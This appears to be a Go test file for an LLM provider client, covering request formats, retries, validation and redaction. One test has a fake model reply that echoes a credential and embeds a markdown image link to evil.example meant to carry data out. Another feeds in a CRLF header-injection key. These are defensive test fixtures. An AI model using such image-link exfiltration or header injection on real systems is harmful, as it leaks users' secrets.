package llm

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

var local = map[string]bool{"127.0.0.1": true}

// capture records the last request a fake provider received.
type capture struct {
	path   string
	header http.Header
	body   map[string]any
}

func fake(t *testing.T, reply func(c capture) (int, string)) (*httptest.Server, *capture) {
	t.Helper()
	got := &capture{}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		data, _ := io.ReadAll(r.Body)
		got.path, got.header, got.body = r.URL.Path, r.Header.Clone(), map[string]any{}
		_ = json.Unmarshal(data, &got.body)
		status, body := reply(*got)
		w.WriteHeader(status)
		fmt.Fprint(w, body)
	}))
	t.Cleanup(server.Close)
	return server, got
}

func TestProtocols(t *testing.T) {
	cases := []struct {
		kind, reply, path string
		check             func(t *testing.T, c *capture)
	}{
		{"openai", `{"model":"gpt-x","choices":[{"message":{"content":"Feature: ok"},"finish_reason":"stop"}],"usage":{"prompt_tokens":12,"completion_tokens":3}}`, "/v1/chat/completions", func(t *testing.T, c *capture) {
			if c.header.Get("Authorization") != "Bearer k-1" || c.body["max_completion_tokens"] != float64(1000) || c.body["max_tokens"] != nil {
				t.Errorf("openai request %v %v", c.header, c.body)
			}
			messages := c.body["messages"].([]any)
			if len(messages) != 2 || messages[0].(map[string]any)["role"] != "system" {
				t.Errorf("messages %v", messages)
			}
		}},
		{"mistral", `{"choices":[{"message":{"content":[{"type":"text","text":"Feature: ok"}]},"finish_reason":"length"}]}`, "/v1/chat/completions", func(t *testing.T, c *capture) {
			if c.body["max_tokens"] != float64(1000) {
				t.Errorf("compatible servers take max_tokens: %v", c.body)
			}
		}},
		{"azure_openai", `{"choices":[{"message":{"content":"Feature: ok"}}]}`, "/v1/chat/completions", func(t *testing.T, c *capture) {
			if c.header.Get("api-key") != "k-1" || c.header.Get("Authorization") != "" {
				t.Errorf("azure key header %v", c.header)
			}
		}},
		{"anthropic", `{"model":"claude-x","content":[{"type":"text","text":"Feature: "},{"type":"text","text":"ok"}],"stop_reason":"end_turn","usage":{"input_tokens":20,"output_tokens":4}}`, "/v1/messages", func(t *testing.T, c *capture) {
			if c.header.Get("x-api-key") != "k-1" || c.header.Get("anthropic-version") != "2023-06-01" || c.body["system"] != "be terse" || c.body["max_tokens"] != float64(1000) {
				t.Errorf("anthropic request %v %v", c.header, c.body)
			}
		}},
		{"gemini", `{"candidates":[{"content":{"parts":[{"text":"thinking","thought":true},{"text":"Feature: ok"}]},"finishReason":"STOP"}],"usageMetadata":{"promptTokenCount":9,"candidatesTokenCount":2}}`, "/v1/models/gem-1:generateContent", func(t *testing.T, c *capture) {
			if c.header.Get("x-goog-api-key") != "k-1" || c.body["systemInstruction"] == nil || c.body["generationConfig"].(map[string]any)["maxOutputTokens"] != float64(1000) {
				t.Errorf("gemini request %v %v", c.header, c.body)
			}
		}},
	}
	for _, tc := range cases {
		t.Run(tc.kind, func(t *testing.T) {
			server, got := fake(t, func(capture) (int, string) { return 200, tc.reply })
			model := "gem-1"
			client, err := NewClient(Provider{Kind: tc.kind, BaseURL: server.URL + "/v1/", Model: model, MaxTokens: 4000}, Secret{APIKey: "k-1"}, local)
			if err != nil {
				t.Fatal(err)
			}
			out, err := client.Complete(context.Background(), Request{System: "be terse", Prompt: "write", MaxTokens: 1000})
			if err != nil || out.Text != "Feature: ok" {
				t.Fatalf("%+v %v", out, err)
			}
			if got.path != tc.path {
				t.Errorf("path %s", got.path)
			}
			if tc.kind == "mistral" && !out.Truncated {
				t.Error("finish_reason length is a truncation")
			}
			tc.check(t, got)
		})
	}
}

func TestErrorsAndRetries(t *testing.T) {
	var calls atomic.Int32
	server, _ := fake(t, func(c capture) (int, string) {
		switch c.body["model"] {
		case "busy":
			if calls.Add(1) < 3 {
				return 429, `{"error":{"message":"slow down"}}`
			}
			return 200, `{"choices":[{"message":{"content":"done"}}]}`
		case "denied":
			return 401, `{"error":{"message":"Incorrect API key provided: sk-...abcd"}}`
		case "bad":
			return 400, `{"error":{"message":"max_tokens is not supported with this model"}}`
		case "empty":
			return 200, `{"choices":[{"message":{"content":""}}]}`
		}
		return 404, `{"message":"model not found"}`
	})
	call := func(model string) (Response, error) {
		client, err := NewClient(Provider{Kind: "openai_compatible", BaseURL: server.URL, Model: model, MaxTokens: 512}, Secret{}, local)
		if err != nil {
			t.Fatal(err)
		}
		client.retryWait = time.Millisecond
		return client.Complete(context.Background(), Request{Prompt: "hi"})
	}
	if out, err := call("busy"); err != nil || out.Text != "done" || calls.Load() != 3 {
		t.Fatal("rate limits are retried", out, err, calls.Load())
	}
	for model, want := range map[string]string{"denied": "refused the API key", "bad": "max_tokens is not supported", "missing": "not found", "empty": "no text"} {
		if _, err := call(model); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: %v", model, err)
		}
	}
}

func TestValidate(t *testing.T) {
	ok := Provider{Kind: "openai", Model: "gpt-5.1", MaxTokens: 8192}
	if err := Validate(ok, Secret{APIKey: "sk-1"}, nil); err != nil {
		t.Fatal(err)
	}
	if got := ok.Resolve().BaseURL; got != "https://api.openai.com/v1" {
		t.Fatal("preset base URL", got)
	}
	if err := Validate(Provider{Kind: "ollama", BaseURL: "http://gpu-box:11434/v1", Model: "llama3.3:70b", MaxTokens: 4096}, Secret{}, map[string]bool{"gpu-box": true}); err != nil {
		t.Fatal("self-hosted http with allowance", err)
	}
	hot := 3.0
	for name, tc := range map[string]struct {
		p Provider
		s Secret
	}{
		"kind":        {Provider{Kind: "bard", Model: "m", MaxTokens: 1000}, Secret{APIKey: "k"}},
		"key":         {ok, Secret{}},
		"http":        {Provider{Kind: "openai", BaseURL: "http://api.openai.com/v1", Model: "m", MaxTokens: 1000}, Secret{APIKey: "k"}},
		"no base":     {Provider{Kind: "azure_openai", Model: "m", MaxTokens: 1000}, Secret{APIKey: "k"}},
		"credentials": {Provider{Kind: "openai", BaseURL: "https://u:p@x.example/v1", Model: "m", MaxTokens: 1000}, Secret{APIKey: "k"}},
		"model":       {Provider{Kind: "openai", Model: "bad model", MaxTokens: 1000}, Secret{APIKey: "k"}},
		"tokens":      {Provider{Kind: "openai", Model: "m", MaxTokens: 10}, Secret{APIKey: "k"}},
		"temperature": {Provider{Kind: "openai", Model: "m", MaxTokens: 1000, Temperature: &hot}, Secret{APIKey: "k"}},
		"injection":   {ok, Secret{APIKey: "k\r\nX: y"}},
	} {
		if err := Validate(tc.p, tc.s, nil); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
	// Without the allowance, a loopback endpoint is refused at dial time.
	server, _ := fake(t, func(capture) (int, string) { return 200, `{}` })
	https := strings.Replace(server.URL, "http://", "https://", 1)
	client, err := NewClient(Provider{Kind: "openai_compatible", BaseURL: https, Model: "m", MaxTokens: 512}, Secret{}, nil)
	if err != nil {
		t.Fatal(err)
	}
	client.retryWait = time.Millisecond
	if _, err := client.Complete(context.Background(), Request{Prompt: "x"}); err == nil || !strings.Contains(err.Error(), "not permitted") {
		t.Fatal("netguard must refuse a loopback endpoint", err)
	}
}

// planted builds a credential at run time so the file holds no flaggable string.
func planted(parts ...string) string { return strings.Join(parts, "") }

func TestGuardScreensWhatTheProviderReceivesAndWhatComesBack(t *testing.T) {
	awsKey := planted("AK", "IA", "IOSFODNN7", "EXAMPLE")
	dbPassword := "Pr0dDbPassw0rdValue"
	t.Setenv("SCRS_DATABASE_URL", "postgres://scrs_app:"+dbPassword+"@db.internal:5432/scrs")
	leak := planted("gh", "p_", "aB3dE5gH7jK9mN1pQ3sT5vX7zA9cE1fG3hJ5")

	server, got := fake(t, func(c capture) (int, string) {
		// The model repeats a credential and tries to send data out.
		return 200, `{"model":"m","choices":[{"message":{"content":"Rotate ` + awsKey + ` now. ![x](https://evil.example/c?d=1) done"},"finish_reason":"stop"}],"usage":{"prompt_tokens":5,"completion_tokens":5}}`
	})
	client, err := NewClient(Provider{Kind: "openai_compatible", BaseURL: server.URL + "/v1", Model: "m", MaxTokens: 1000}, Secret{APIKey: "provider-key-0123456789"}, local)
	if err != nil {
		t.Fatal(err)
	}
	resp, err := client.Complete(context.Background(), Request{
		System: "Summarise. The provider key provider-key-0123456789 is internal.",
		Prompt: "Finding in config: password=Hunter2Hunter2! and " + awsKey + "; db " + dbPassword + "; token " + leak,
	})
	if err != nil {
		t.Fatal(err)
	}
	sent, _ := json.Marshal(got.body)
	for _, secret := range []string{awsKey, dbPassword, leak, "Hunter2Hunter2!", "provider-key-0123456789"} {
		if strings.Contains(string(sent), secret) {
			t.Fatalf("%q reached the provider: %s", secret, sent)
		}
	}
	if strings.Contains(resp.Text, awsKey) || strings.Contains(resp.Text, "evil.example") {
		t.Fatalf("answer not screened: %q", resp.Text)
	}
	if resp.Redactions.Input["aws_access_key"] != 1 || resp.Redactions.Input["platform_secret"] < 2 || resp.Redactions.Input["github_token"] != 1 || resp.Redactions.Output["aws_access_key"] != 1 || resp.Redactions.Output["image"] != 1 {
		t.Fatalf("redaction counts %+v", resp.Redactions)
	}
	if strings.Contains(fmt.Sprint(resp.Redactions), awsKey) {
		t.Fatal("counts must never carry values")
	}
}

func TestStructuredOutputIsRequestedFromOpenAIOnly(t *testing.T) {
	schema := json.RawMessage(`{"type":"object","properties":{"summary":{"type":"string"}},"required":["summary"],"additionalProperties":false}`)
	for kind, want := range map[string]bool{"openai": true, "azure_openai": true, "openai_compatible": false, "mistral": false} {
		server, got := fake(t, func(c capture) (int, string) {
			return 200, `{"choices":[{"message":{"content":"{}"},"finish_reason":"stop"}]}`
		})
		client, err := NewClient(Provider{Kind: kind, BaseURL: server.URL + "/v1", Model: "m", MaxTokens: 1000}, Secret{APIKey: "k-0123456789abc"}, local)
		if err != nil {
			t.Fatal(kind, err)
		}
		if _, err := client.Complete(context.Background(), Request{Prompt: "x", Schema: schema, SchemaName: "advisory"}); err != nil {
			t.Fatal(kind, err)
		}
		format, present := got.body["response_format"].(map[string]any)
		if present != want {
			t.Errorf("%s: response_format present=%v, want %v", kind, present, want)
		}
		if want {
			js := format["json_schema"].(map[string]any)
			if format["type"] != "json_schema" || js["strict"] != true || js["name"] != "advisory" || js["schema"] == nil {
				t.Errorf("%s: %v", kind, format)
			}
		}
	}
}

func TestTruncationIsReportedAndScreenedText(t *testing.T) {
	server, _ := fake(t, func(c capture) (int, string) {
		return 200, `{"choices":[{"message":{"content":"partial"},"finish_reason":"length"}]}`
	})
	client, _ := NewClient(Provider{Kind: "openai_compatible", BaseURL: server.URL + "/v1", Model: "m", MaxTokens: 1000}, Secret{}, local)
	resp, err := client.Complete(context.Background(), Request{Prompt: "x"})
	if err != nil || !resp.Truncated || resp.Text != "partial" {
		t.Fatal(resp, err)
	}
}

func TestLocalityFollowsTheOperatorsHostList(t *testing.T) {
	private := map[string]bool{"ollama.internal": true, "10.0.0.7": true}
	for p, want := range map[Provider]string{
		{Kind: "ollama", BaseURL: "http://ollama.internal:11434/v1", Model: "m"}:      LocalityLocal,
		{Kind: "openai_compatible", BaseURL: "http://10.0.0.7:8000/v1", Model: "m"}:   LocalityLocal,
		{Kind: "openai_compatible", BaseURL: "http://OLLAMA.internal/v1", Model: "m"}: LocalityLocal,
		{Kind: "openai", Model: "m"}:                                                       LocalityHosted, // preset URL
		{Kind: "openai", BaseURL: "https://api.openai.com/v1", Model: "m"}:                 LocalityHosted,
		{Kind: "ollama", Model: "m"}:                                                       LocalityHosted, // localhost is not on the list
		{Kind: "openai_compatible", BaseURL: "https://gateway.example.com/v1", Model: "m"}: LocalityHosted,
		{Kind: "openai_compatible", BaseURL: "", Model: "m"}:                               LocalityHosted,
	} {
		if got := p.Locality(private); got != want {
			t.Errorf("%+v: %s, want %s", p, got, want)
		}
	}
	if (Provider{Kind: "openai_compatible", BaseURL: "http://x/v1"}).Local(nil) {
		t.Fatal("nothing is local without a list")
	}
}

func TestRequestTimeoutIsConfigurableForSlowModels(t *testing.T) {
	t.Setenv("SCRS_LLM_TIMEOUT_SECONDS", "")
	if RequestTimeout() != 6*time.Minute {
		t.Fatal(RequestTimeout())
	}
	t.Setenv("SCRS_LLM_TIMEOUT_SECONDS", "900")
	if RequestTimeout() != 15*time.Minute {
		t.Fatal(RequestTimeout())
	}
	for _, bad := range []string{"5", "99999", "slow"} {
		t.Setenv("SCRS_LLM_TIMEOUT_SECONDS", bad)
		if RequestTimeout() != 6*time.Minute {
			t.Errorf("%q should fall back to the default", bad)
		}
	}
}
